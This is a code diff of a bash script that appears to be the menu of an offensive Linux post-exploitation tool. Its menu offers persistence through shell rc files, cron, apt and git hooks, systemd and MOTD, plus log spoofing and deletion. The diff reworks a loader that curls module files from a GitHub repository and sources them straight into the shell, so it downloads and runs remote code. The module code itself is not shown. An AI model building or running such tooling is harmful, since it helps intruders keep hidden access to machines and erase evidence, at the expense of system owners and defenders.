@@ -42,7 +42,6 @@ text_banner="
  ${RED} \___)=(___/${EOC} "
 
 options="
-\t\t${RED}[ - FUNCTIONS - ]${EOC}
 \t\t${RED}[ - MAIN FUNCTIONS - ]${EOC}
 \t${RED}$(line)${EOC}
 \t${RED}[1]${EOC} ${BOLD}- Manage Users [view|add|delete]                      ${EOC}
@@ -96,16 +95,14 @@ export LC_ALL current_shell random priv_status BOLD RED ALERT EOC
 
 
 download_func(){
-    local f_name
-    local f_file=functions/$f_name;
-    if [[ ! -f "$f_file" ]]; then
-        echo -e "${RED}[!]${EOC} Function ${BOLD}$f_file${EOC} not found locally. Downloading..."
-        if ! curl -fsSL "https://raw.githubusercontent.com/oxb1te/terminatedshell/main/functions/$f_name" -o "$f_file"; 
+    if [[ ! -f ./functions/"${1}" ]]; then
+        echo -e "${RED}[!]${EOC} Function ${BOLD}${1}${EOC} not found locally. Downloading..."
+        if ! curl -fsSL "https://raw.githubusercontent.com/oxb1te/terminatedshell/main/functions/${1}" -o "./functions/${1}"; 
         then
-            echo -e "${RED}[x]${EOC} Failed to download ${BOLD}$f_file${EOC}."
+            echo -e "${RED}[x]${EOC} Failed to download ${BOLD}${1}${EOC}."
             return 0
         else
-            echo -e "${RED}[+]${EOC} ${BOLD}$f_file${EOC} download successfuly."
+            echo -e "${RED}[+]${EOC} ${BOLD}${1}${EOC} download successfuly."
         fi
     fi;
     return 0
@@ -114,7 +111,7 @@ download_func(){
 
 # --- User management [ View | Add | Delete ] --- 
 manage_users() {
-    if download_func "MANAGE_USERS" && . functions/MANAGE_USERS; then
+    if download_func "MANAGE_USERS" && . ./functions/MANAGE_USERS; then
         echo -e "\n${RED}[+]${EOC} ${BOLD}User management${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
     else
         echo -e "\n${RED}[x]${EOC} ${BOLD}User management${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
@@ -123,7 +120,7 @@ manage_users() {
 
 # --- Shell Configuration Persistence File [ bash | zshrc ] ---
 shell_func(){
-    if download_func "SHELL" && . functions/SHELL; then
+    if download_func "SHELL" && . ./functions/SHELL; then
         echo -e "\n${RED}[+]${EOC} ${BOLD}Shell${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
     else
         echo -e "\n${RED}[x]${EOC} ${BOLD}Shell${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
@@ -132,7 +129,7 @@ shell_func(){
 
 # --- Cron Persistance ---
 cron_func(){
-    if download_func "CRON" && . functions/CRON; then
+    if download_func "CRON" && . ./functions/CRON; then
         echo -e "\n${RED}[+]${EOC} ${BOLD}Cron${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
     else
         echo -e "\n${RED}[x]${EOC} ${BOLD}Cron${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
@@ -141,7 +138,7 @@ cron_func(){
 
 # --- Hooks presistance [ Apt pre-invoke and Git pre-commit ] ---
 hooks_func(){
-    if download_func "HOOKS" && . functions/HOOKS; then
+    if download_func "HOOKS" && . ./functions/HOOKS; then
         echo -e "\n${RED}[+]${EOC} ${BOLD}Hooks${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
     else
         echo -e "\n${RED}[x]${EOC} ${BOLD}Hooks${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
@@ -150,7 +147,8 @@ hooks_func(){
 
 # --- Systemd persistence [ User/SU level]---
 systemd_func(){
-    if download_func "SYSTEMD" && . functions/SYSTEMD; then
+    # shellcheck disable=SC1094
+    if download_func "SYSTEMD" && . ./functions/SYSTEMD; then
         echo -e "\n${RED}[+]${EOC} ${BOLD}Systemd${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
     else
         echo -e "\n${RED}[x]${EOC} ${BOLD}Systemd${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
@@ -160,7 +158,7 @@ systemd_func(){
 # --- MOTD persistence ---  
 motd_func(){
 if [[ $priv_status == "is_su" ]]; then
-    if download_func "MOTD" && . functions/MOTD; then
+    if download_func "MOTD" && . ./functions/MOTD; then
         echo -e "\n${RED}[+]${EOC} ${BOLD}MOTD${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
     else
         echo -e "\n${RED}[x]${EOC} ${BOLD}MOTD${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
@@ -172,7 +170,7 @@ fi
 
 # --- Logs [ spoof | delete & disable ] ---
 logs_func(){
-    if download_func "LOGS" && . functions/LOGS; then
+    if download_func "LOGS" && . ./functions/LOGS; then
         echo -e "\n${RED}[+]${EOC} ${BOLD}LOGS${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
     else
         echo -e "\n${RED}[x]${EOC} ${BOLD}LOGS${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
